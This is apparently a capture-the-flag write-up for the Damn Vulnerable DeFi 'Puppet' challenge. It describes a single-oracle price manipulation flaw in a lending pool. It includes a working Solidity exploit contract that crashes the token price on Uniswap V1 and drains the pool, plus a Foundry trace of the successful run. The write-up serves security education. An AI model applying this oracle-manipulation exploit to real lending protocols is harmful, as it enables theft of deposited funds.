# Damn Vulnerable Defi - Puppet
- Scope
    - PuppetPool.sol
    - IUniswapV1Factory.sol  
    - IUniswapV1Exchange.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## `PuppetPool.sol` single price oracle dependency allows for token price manipulation

### Summary
The PuppetPool rely on a single price oracle UniswapV1Exchange which has low liquidity, allowing manipulation of the value of DVT token and allow draining the token from PuppetPool.

### Vulnerability Details
Single reliance on UniswapV1Exchange as price oracle and low liquidity exchange. Allowing manipulation of a single token value.

### Impact/Proof of Concept
1. Deposit large amount of DVT into Uniswap and make the value of DVT drop
2. Use little ETH to swap for the DVT in PuppetPool, as it perceives DVT token value from the Uniswap to be very low.
```
function test_puppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
        console.log("pool balance: ", token.balanceOf(address(lendingPool)));
    }

contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
        lendingPool.borrow{value: address(this).balance}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {
    }
}
```

Results
```diff
[PASS] test_puppet() (gas: 391876)
Logs:
  pool balance:  0

Traces:
  [391876] PuppetChallenge::test_puppet()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [220842] → new Exploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 658 bytes of code
    ├─ [29674] DamnValuableToken::transfer(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [134144] Exploit::attack(100000000000000000000000 [1e23])
    │   ├─ [519] DamnValuableToken::balanceOf(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [24523] DamnValuableToken::approve(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   ├─ emit Approval(owner: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [26172] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::tokenToEthTransferInput(1000000000000000000000 [1e21], 9, 1, Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [23093] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::tokenToEthTransferInput(1000000000000000000000 [1e21], 9, 1, Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [delegatecall]
    │   │   │   ├─ [2519] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   │   │   ├─ [55] Exploit::receive{value: 9900695134061569016}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [6528] DamnValuableToken::transferFrom(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit EthPurchase(buyer: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokens_sold: 1000000000000000000000 [1e21], eth_bought: 9900695134061569016 [9.9e18])
    │   │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   ├─ [68373] PuppetPool::borrow{value: 34900695134061569016}(100000000000000000000000 [1e23], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   ├─ [519] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   │   ├─ [55] Exploit::receive{value: 15236365245263369016}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [29674] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Borrowed(account: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], recipient: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], depositRequired: 19664329888798200000 [1.966e19], borrowAmount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [519] DamnValuableToken::balanceOf(PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("pool balance: ", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::assertGe(100000000000000000000000 [1e23], 100000000000000000000000 [1e23], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.98ms (840.23µs CPU time)

Ran 2 test suites in 1.03s (2.58ms CPU time): 2 tests passed, 1 failed, 0 skipped (3 total tests)
```
